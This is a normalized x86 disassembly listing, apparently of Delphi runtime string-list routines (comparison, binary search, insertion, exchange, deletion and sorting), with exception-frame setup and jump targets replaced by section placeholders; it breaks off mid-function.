jmp r-xdata
sub_419ce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a4a0
mov eax [ ebp - 0x8 ]
push eax
push sub_41a750
push ebp
call sub_419c90
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419d48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419ddd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419de4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040d0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4044b8
jne r-xdata
sub_419df4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419df0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
jmp sub_403a64
sub_419e2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419e74
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405e08
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419df4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e7b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_419e84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_419f3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f41
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
sub_419f78
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419fbd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40456c
call sub_408b28
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fc4
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_419fcc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a0d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404144
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40419c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0de
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_4040d0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40436c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40436c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40436c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40436c
mov ebx eax
test ebx ebx
je r-xdata
sub_41a0f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a16c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a173
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a180
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a243
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4045cc
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a7e0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404294
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c7b4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a24a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_41a254
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a2b8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b380
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a300
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a307
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_41a30c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a3a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_41a38c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41ae68
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40419c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a393
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
sub_41a3b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a459
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a460
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_41a43c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
sub_41a468
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a4a0
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a544
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d0bc
mov eax [ ebp - 0x4 ]
call sub_419c78
xor eax eax
push ebp
push sub_41a51f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c158
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dd5c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a526
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
sub_41a550
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b380
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a59b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5a2
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_41a5a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a5f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40436c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b0cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5fc
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41a608
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40595c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a63c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a67f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4042a4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a686
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41a68c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a740
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419c78
xor edx edx
push ebp
push sub_41a723
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a72a
mov eax [ ebp - 0x4 ]
call sub_419d34
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40419c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a750
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a7c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f2f0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a7cd
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420a64
inc esi
dec ebx
jne r-xdata
sub_41a7f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a814
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419ab0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404b54
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_41a87c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e2c
jmp r-xdata
sub_41a918
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404b54
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a958
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404c40
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a9c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419e2c
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41aa20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41aa20
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41aa44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41aabc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_404100
pop edi
pop esi
pop ebx
retn
sub_41aaf8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41ab20
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41ab54
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a0f4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41aba0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e2c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41abf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41ab20
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404100
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028e8
sub_41ac6c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e2c
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41acc8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e2c
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ad08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41aa20
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
